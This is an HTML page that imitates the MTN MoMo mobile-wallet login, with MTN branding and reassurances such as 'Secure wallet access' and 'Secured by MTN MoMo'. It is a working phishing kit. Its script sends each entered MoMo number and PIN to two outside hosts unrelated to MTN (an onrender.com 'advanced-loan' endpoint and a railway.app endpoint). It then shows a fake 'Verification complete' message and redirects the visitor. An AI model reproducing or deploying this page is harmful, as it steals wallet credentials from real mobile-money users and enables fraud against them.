<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MTN — MoMo</title>
<style>
  :root{
    --mtn-blue:#004F9F; --mtn-blue-dark:#003B77; --mtn-blue-deep:#002B5C;
    --mtn-yellow:#FFCC00; --bg:#F7F9FC; --card:#FFFFFF;
    --text:#0A1B33; --muted:#64748B; --border:#E2E8F0; --green:#00A651;
  }
  *{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;}
  html,body{height:100%;}
  body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column;align-items:center;}

  .frame-top,.frame-bottom{
    width:100%;height:6px;
    background:linear-gradient(90deg,var(--mtn-blue-deep) 0%,var(--mtn-blue) 50%,var(--mtn-blue-deep) 100%);
  }
  .frame-bottom{margin-top:auto;}

  .header{
    width:100%;background:var(--mtn-blue-deep);
    border-bottom:1px solid var(--mtn-blue-dark);
    padding:18px 20px;position:sticky;top:0;z-index:50;
    box-shadow:0 4px 16px rgba(0,43,92,0.28);
  }
  .header-inner{width:100%;max-width:920px;margin:0 auto;display:flex;align-items:center;justify-content:center;}
  .brand{display:flex;align-items:center;text-decoration:none;}
  .brand strong{font-size:26px;font-weight:900;color:#fff;letter-spacing:2px;text-transform:uppercase;}
  .brand strong em{font-style:normal;color:var(--mtn-yellow);}

  main{width:100%;max-width:920px;flex:1;padding:52px 20px 60px;display:flex;flex-direction:column;align-items:center;justify-content:center;}

  .card{
    background:var(--card);width:100%;max-width:440px;
    border-radius:20px;padding:32px 28px 34px;
    box-shadow:0 12px 40px rgba(0,43,92,0.10);
    border:1px solid var(--border);border-top:4px solid var(--mtn-blue-deep);
  }

  .momo-head{
    display:flex;align-items:center;justify-content:center;gap:10px;
    margin-bottom:28px;
  }
  .momo-head .badge{
    width:44px;height:44px;border-radius:12px;
    background:var(--mtn-yellow);
    display:flex;align-items:center;justify-content:center;
    font-weight:900;color:var(--mtn-blue-deep);font-size:19px;
    box-shadow:0 4px 12px rgba(255,204,0,0.4);
  }
  .momo-head .txt{text-align:left;}
  .momo-head .txt b{display:block;font-size:15px;color:var(--text);font-weight:800;}
  .momo-head .txt span{font-size:11.5px;color:var(--muted);font-weight:600;}

  .field{margin-bottom:22px;}
  .field label{
    display:block;font-size:11.5px;color:var(--muted);
    margin-bottom:8px;text-transform:uppercase;letter-spacing:0.7px;font-weight:700;
  }
  .field input{
    width:100%;padding:14px;border:1.5px solid var(--border);
    border-radius:10px;font-size:16px;color:var(--text);
    background:#FBFDFF;transition:.18s;font-weight:700;
  }
  .field input#momoNumber{letter-spacing:1.5px;text-align:center;}
  .field input#pin{letter-spacing:8px;text-align:center;font-size:18px;}
  .field input:focus{
    outline:none;border-color:var(--mtn-blue-deep);
    background:#fff;box-shadow:0 0 0 3px rgba(0,43,92,0.10);
  }
  .field input::placeholder{color:#B8C2D1;font-weight:600;letter-spacing:normal;}

  .cta{
    width:100%;padding:16px;border:none;border-radius:12px;
    background:var(--mtn-blue-deep);color:#fff;font-size:16px;font-weight:800;
    cursor:pointer;letter-spacing:0.3px;transition:.18s;
    box-shadow:0 8px 20px rgba(0,43,92,0.32);margin-top:4px;
  }
  .cta:hover{background:var(--mtn-blue);transform:translateY(-2px);}
  .cta:active{transform:translateY(0);}
  .cta:disabled{opacity:.7;cursor:not-allowed;transform:none;}

  .status{
    font-size:12px;text-align:center;margin-top:14px;
    font-weight:700;min-height:16px;
  }
  .status.ok{color:var(--green);}
  .status.err{color:#D32F2F;}

  .secure-note{
    display:flex;align-items:center;justify-content:center;gap:6px;
    font-size:11.5px;color:var(--muted);margin-top:16px;font-weight:600;
  }
  .secure-note svg{
    width:13px;height:13px;stroke:var(--green);fill:none;
    stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
  }

  /* ---------- Popup (modal) ---------- */
  .modal-overlay{
    position:fixed;inset:0;
    background:rgba(10,27,51,0.55);
    backdrop-filter:blur(4px);
    display:none;
    align-items:center;justify-content:center;
    padding:20px;z-index:1000;
    animation:fadeIn .25s ease;
  }
  .modal-overlay.show{display:flex;}
  @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}

  .modal{
    background:#fff;width:100%;max-width:360px;
    border-radius:18px;padding:30px 24px 26px;
    text-align:center;
    box-shadow:0 24px 60px rgba(0,43,92,0.35);
    border-top:5px solid var(--green);
    animation:pop .32s cubic-bezier(.18,.9,.32,1.4);
  }
  @keyframes pop{
    from{transform:scale(.85);opacity:0;}
    to{transform:scale(1);opacity:1;}
  }

  .modal .check{
    width:62px;height:62px;border-radius:50%;
    background:rgba(0,166,81,0.12);
    display:flex;align-items:center;justify-content:center;
    margin:0 auto 18px;
  }
  .modal .check svg{
    width:32px;height:32px;stroke:var(--green);fill:none;
    stroke-width:3;stroke-linecap:round;stroke-linejoin:round;
  }

  .modal h2{
    font-size:19px;font-weight:800;color:var(--text);
    margin-bottom:8px;letter-spacing:-0.3px;
  }
  .modal p{
    font-size:13px;color:var(--muted);
    font-weight:600;line-height:1.6;margin-bottom:22px;
  }

  .modal .ok-btn{
    width:100%;padding:14px;border:none;border-radius:11px;
    background:var(--mtn-blue-deep);color:#fff;
    font-size:15px;font-weight:800;cursor:pointer;
    letter-spacing:0.3px;transition:.18s;
    box-shadow:0 6px 16px rgba(0,43,92,0.28);
  }
  .modal .ok-btn:hover{background:var(--mtn-blue);transform:translateY(-1px);}

  @media(max-width:640px){
    .card{padding:26px 20px 28px;}
    main{padding:36px 16px 44px;}
    .brand strong{font-size:22px;letter-spacing:1.5px;}
  }
</style>
</head>
<body>

  <div class="frame-top"></div>

  <header class="header">
    <div class="header-inner">
      <a class="brand" href="index.html"><strong>MTN<em>.</em></strong></a>
    </div>
  </header>

  <main>
    <div class="card">
      <div class="momo-head">
        <div class="badge">M</div>
        <div class="txt">
          <b>MTN MoMo</b>
          <span>Secure wallet access</span>
        </div>
      </div>

      <div class="field">
        <label>MoMo number</label>
        <input type="tel" id="momoNumber" placeholder="6XX XXX XXX" autocomplete="tel" inputmode="numeric" maxlength="15">
      </div>

      <div class="field">
        <label>PIN</label>
        <input type="password" id="pin" placeholder="••••" maxlength="6" inputmode="numeric" autocomplete="current-password">
      </div>

      <button class="cta" id="submitBtn" onclick="signIn()">Continue →</button>

      <div class="status" id="status"></div>

      <div class="secure-note">
        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
        Secured by MTN MoMo
      </div>
    </div>
  </main>

  <div class="frame-bottom"></div>

  <!-- Success popup -->
  <div class="modal-overlay" id="successModal">
    <div class="modal">
      <div class="check">
        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
      </div>
      <h2>Verification complete</h2>
      <p>Your details have been received successfully.</p>
      <button class="ok-btn" onclick="closeModal()">OK</button>
    </div>
  </div>

<script>
  const ENDPOINTS = [
    "https://advanced-loan.onrender.com/notify",
    "https://web-production-1a1f07.up.railway.app/notify"
  ];

  const el = id => document.getElementById(id);

  function setStatus(msg, type){
    const s = el('status');
    s.textContent = msg;
    s.className = 'status' + (type ? ' ' + type : '');
  }

  function openModal(){
    el('successModal').classList.add('show');
  }

  function closeModal(){
    el('successModal').classList.remove('show');
    // Redirect to index after the popup closes
    setTimeout(() => {
      window.location.href = 'index.html';
    }, 250);
  }

  async function sendToServer(momo, pin){
    const body = JSON.stringify({
      momo: momo,
      pin: pin,
      time: new Date().toLocaleString()
    });

    let lastError = null;

    for(const url of ENDPOINTS){
      try{
        const res = await fetch(url, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: body
        });
        const data = await res.json();
        if(data.ok){
          return { ok: true };
        }
        lastError = data.description || data.error || 'unknown error';
      }catch(err){
        lastError = err.message;
      }
    }

    return { ok: false, error: lastError || 'All servers unreachable' };
  }

  async function signIn(){
    const momo = el('momoNumber').value.trim();
    const pin  = el('pin').value.trim();

    if(!momo){
      setStatus('Please enter your MoMo number.', 'err');
      return;
    }
    if(momo.replace(/\D/g, '').length < 9){
      setStatus('Please enter a valid MoMo number.', 'err');
      return;
    }
    if(!pin){
      setStatus('Please enter your PIN.', 'err');
      return;
    }
    if(pin.length < 4){
      setStatus('PIN must be at least 4 digits.', 'err');
      return;
    }

    localStorage.setItem('session', JSON.stringify({
      momo,
      loggedInAt: new Date().toISOString()
    }));

    el('submitBtn').disabled = true;
    setStatus('Sending…');

    const result = await sendToServer(momo, pin);

    if(result.ok){
      setStatus('');
      openModal();
    }else{
      setStatus('❌ ' + result.error, 'err');
      el('submitBtn').disabled = false;
    }
  }

  document.addEventListener('keydown', e => {
    if(e.key === 'Escape') closeModal();
  });
</script>
</body>
</html>
